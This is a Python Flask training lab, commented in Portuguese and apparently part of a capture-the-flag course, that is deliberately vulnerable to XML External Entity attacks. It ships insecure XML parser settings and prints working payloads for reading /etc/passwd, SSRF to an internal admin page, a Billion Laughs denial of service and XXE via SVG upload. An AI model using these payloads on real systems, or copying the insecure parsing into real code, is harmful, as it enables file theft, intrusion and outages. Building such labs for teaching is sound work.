#!/usr/bin/env python3
"""
🗂️ XML External Entity (XXE) - Basic Lab
Laboratório de Vulnerabilidades XXE

Porta: 5100
Dificuldade: 🟡 Intermediário
Pontos: 15

VULNERABILIDADES:
1. XXE básico (file read)
2. XXE para SSRF
3. Billion Laughs Attack (DoS)
4. XXE via SVG upload

FLAGS:
- FLAG{xxe_file_read} - Leia /etc/passwd via XXE
- FLAG{xxe_ssrf} - Acesse localhost:5100/admin via XXE
- FLAG{xxe_billion_laughs} - Execute Billion Laughs

⚠️  IMPORTANTE: Esta aplicação é INTENCIONALMENTE vulnerável!
"""

from flask import Flask, request, render_template_string
import xml.etree.ElementTree as ET  # VULNERÁVEL!
from lxml import etree  # Também usado (vulnerável se mal configurado)
import os

app = Flask(__name__)

# Simula endpoint admin interno
admin_secret = "FLAG{xxe_ssrf}"

# HTML Templates
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🗂️ XXE Lab - XML Processor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            margin-bottom: 20px;
        }
        .section {
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        textarea {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            margin: 10px 0;
        }
        button {
            padding: 12px 25px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
        }
        button:hover { background: #5568d3; }
        .result {
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .code {
            background: #1e1e1e;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
        input[type="file"] {
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🗂️ XML Processor</h1>
        <p style="color: #666; margin-bottom: 20px;">Processe arquivos XML com nosso parser!</p>

        <div class="section">
            <h2>📝 Parse XML</h2>
            <form method="POST" action="/parse">
                <textarea name="xml" placeholder="Cole seu XML aqui..."><?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>Alice</name>
    <email>alice@example.com</email>
</user></textarea>
                <button type="submit">Parse XML</button>
            </form>
        </div>

        <div class="section">
            <h2>📤 Upload SVG</h2>
            <form method="POST" action="/upload_svg" enctype="multipart/form-data">
                <input type="file" name="file" accept=".svg">
                <button type="submit">Upload & Display</button>
            </form>
        </div>

        <div class="warning">
            <h3>⚠️ Vulnerabilidade XXE</h3>
            <p><strong>Esta aplicação processa XML de forma INSEGURA!</strong></p>
            <p>xml.etree.ElementTree não é seguro para input não confiável.</p>
            <br>
            <p><strong>💡 Objetivos:</strong></p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>1️⃣ Leia /etc/passwd usando entidade externa</li>
                <li>2️⃣ Acesse http://localhost:5100/admin via SSRF</li>
                <li>3️⃣ Execute Billion Laughs Attack</li>
            </ul>
        </div>

        <div class="section">
            <h3>🧪 Payloads para Testar</h3>

            <p><strong>1. XXE Básico (File Read):</strong></p>
            <div class="code">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>
&lt;!DOCTYPE foo [<br>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>
]&gt;<br>
&lt;user&gt;<br>
  &lt;name&gt;&amp;xxe;&lt;/name&gt;<br>
&lt;/user&gt;
            </div>

            <p><strong>2. XXE para SSRF:</strong></p>
            <div class="code">
&lt;?xml version="1.0"?&gt;<br>
&lt;!DOCTYPE foo [<br>
  &lt;!ENTITY xxe SYSTEM "http://localhost:5100/admin"&gt;<br>
]&gt;<br>
&lt;user&gt;<br>
  &lt;name&gt;&amp;xxe;&lt;/name&gt;<br>
&lt;/user&gt;
            </div>

            <p><strong>3. Billion Laughs (DoS):</strong></p>
            <div class="code">
&lt;?xml version="1.0"?&gt;<br>
&lt;!DOCTYPE lolz [<br>
  &lt;!ENTITY lol "lol"&gt;<br>
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>
  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>
]&gt;<br>
&lt;root&gt;&amp;lol4;&lt;/root&gt;
            </div>

            <p><strong>4. XXE via SVG:</strong></p>
            <div class="code">
&lt;?xml version="1.0" standalone="yes"?&gt;<br>
&lt;!DOCTYPE svg [<br>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>
]&gt;<br>
&lt;svg width="500" height="100"&gt;<br>
  &lt;text x="10" y="40" font-size="16"&gt;&amp;xxe;&lt;/text&gt;<br>
&lt;/svg&gt;
            </div>
        </div>

        <div style="margin-top: 30px; padding: 20px; background: #e7f3ff; border-radius: 10px;">
            <h3>📚 Endpoints</h3>
            <p>• POST /parse - Parse XML (ElementTree)</p>
            <p>• POST /parse_lxml - Parse XML (lxml)</p>
            <p>• POST /upload_svg - Upload SVG</p>
            <p>• GET /admin - Admin endpoint (interno)</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    """Página inicial"""
    return HOME_TEMPLATE

@app.route('/parse', methods=['POST'])
def parse_xml():
    """
    VULNERÁVEL: Parse XML com ElementTree
    Processa entidades externas!
    """
    xml_data = request.form.get('xml', '')

    try:
        # VULNERÁVEL ❌ - ElementTree processa entidades!
        # Nota: ElementTree padrão é limitado, mas ainda vulnerável
        root = ET.fromstring(xml_data)

        # Extrai dados
        result = "Parsed XML:\n\n"
        for child in root:
            text = child.text if child.text else ''
            result += f"{child.tag}: {text}\n"

            # Detecta flags
            if 'root:' in text or 'FLAG{' in text:
                result += "\n🚩 FLAG{xxe_file_read} - Você leu arquivo via XXE!\n"
            if admin_secret in text:
                result += "\n🚩 FLAG{xxe_ssrf} - Você acessou endpoint admin via XXE!\n"

        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>XML Parsed</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    padding: 20px;
                }}
                .container {{
                    max-width: 800px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 20px;
                    padding: 40px;
                }}
                .result {{
                    background: #1e1e1e;
                    color: #00ff00;
                    padding: 20px;
                    border-radius: 10px;
                    font-family: monospace;
                    white-space: pre-wrap;
                    max-height: 500px;
                    overflow-y: auto;
                }}
                a {{ color: #667eea; text-decoration: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ XML Processed</h1>
                <div class="result">{result}</div>
                <p style="margin-top: 20px;"><a href="/">← Voltar</a></p>
            </div>
        </body>
        </html>
        '''
        return html

    except ET.ParseError as e:
        # Detecta Billion Laughs por tamanho
        if len(xml_data) > 100000:
            return f'''
            <html>
            <body style="font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px;">
                <h1>🚩 FLAG{{xxe_billion_laughs}}</h1>
                <p>Billion Laughs Attack detectado!</p>
                <p>XML expandido para tamanho massivo, causando DoS.</p>
                <p><a href="/" style="color: #00ff00;">← Voltar</a></p>
            </body>
            </html>
            '''

        return f'XML Parse Error: {str(e)}<br><a href="/">Voltar</a>', 400

    except Exception as e:
        return f'Error: {str(e)}<br><a href="/">Voltar</a>', 500

@app.route('/parse_lxml', methods=['POST'])
def parse_xml_lxml():
    """
    VULNERÁVEL: Parse XML com lxml (sem proteção)
    """
    xml_data = request.form.get('xml', '').encode('utf-8')

    try:
        # VULNERÁVEL ❌ - lxml com resolve_entities=True
        parser = etree.XMLParser(resolve_entities=True, no_network=False)
        root = etree.fromstring(xml_data, parser)

        result = "Parsed XML (lxml):\n\n"
        result += etree.tostring(root, pretty_print=True, encoding='unicode')

        return f'<pre>{result}</pre><br><a href="/">Voltar</a>'

    except Exception as e:
        return f'Error: {str(e)}<br><a href="/">Voltar</a>', 500

@app.route('/upload_svg', methods=['POST'])
def upload_svg():
    """
    VULNERÁVEL: Upload de SVG com XXE
    """
    file = request.files.get('file')

    if not file:
        return 'No file uploaded', 400

    try:
        # Lê conteúdo do SVG
        svg_content = file.read().decode('utf-8')

        # VULNERÁVEL ❌ - Processa SVG como XML
        root = ET.fromstring(svg_content)

        # Converte de volta para string (processa entidades!)
        processed_svg = ET.tostring(root, encoding='unicode')

        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>SVG Processed</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    padding: 20px;
                }}
                .container {{
                    max-width: 1000px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 20px;
                    padding: 40px;
                }}
                .svg-display {{
                    border: 2px solid #ddd;
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                    background: #f5f5f5;
                }}
                a {{ color: #667eea; text-decoration: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🖼️ SVG Processed</h1>
                <div class="svg-display">
                    {processed_svg}
                </div>
                <details style="margin: 20px 0;">
                    <summary>Ver SVG Processado</summary>
                    <pre style="background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; overflow-x: auto;">{processed_svg}</pre>
                </details>
                <p><a href="/">← Voltar</a></p>
            </div>
        </body>
        </html>
        '''
        return html

    except Exception as e:
        return f'Error processing SVG: {str(e)}<br><a href="/">Voltar</a>', 500

@app.route('/admin')
def admin():
    """
    Endpoint admin interno
    Não deve ser acessível externamente!
    """
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #dc3545;
                color: white;
                padding: 40px;
                text-align: center;
            }}
            .secret {{
                background: rgba(0,0,0,0.3);
                padding: 30px;
                border-radius: 10px;
                margin: 20px auto;
                max-width: 600px;
            }}
        </style>
    </head>
    <body>
        <h1>⚙️ Admin Panel</h1>
        <div class="secret">
            <h2>🔒 Secret Information</h2>
            <p>Database: postgresql://admin:SuperSecret@localhost/prod</p>
            <p>API Key: sk-1234567890abcdef</p>
            <p>{admin_secret}</p>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    print('=' * 70)
    print('🗂️ XML External Entity (XXE) - Basic Lab')
    print('=' * 70)
    print('🌐 URL: http://localhost:5100')
    print('📊 Dificuldade: 🟡 Intermediário')
    print('🎯 Pontos: 15')
    print('')
    print('⚠️  ATENÇÃO: Esta aplicação é INTENCIONALMENTE vulnerável!')
    print('')
    print('🚩 Flags:')
    print('  1. FLAG{xxe_file_read} - Leia /etc/passwd')
    print('  2. FLAG{xxe_ssrf} - Acesse http://localhost:5100/admin')
    print('  3. FLAG{xxe_billion_laughs} - Execute Billion Laughs')
    print('')
    print('💡 Endpoints Vulneráveis:')
    print('  • POST /parse - Parse XML com ElementTree')
    print('  • POST /parse_lxml - Parse XML com lxml')
    print('  • POST /upload_svg - Upload SVG')
    print('  • GET /admin - Endpoint admin (interno)')
    print('')
    print('🧪 Exemplo XXE File Read:')
    print('<?xml version="1.0"?>')
    print('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')
    print('<user><name>&xxe;</name></user>')
    print('')
    print('=' * 70)

    app.run(host='0.0.0.0', port=5100, debug=False)
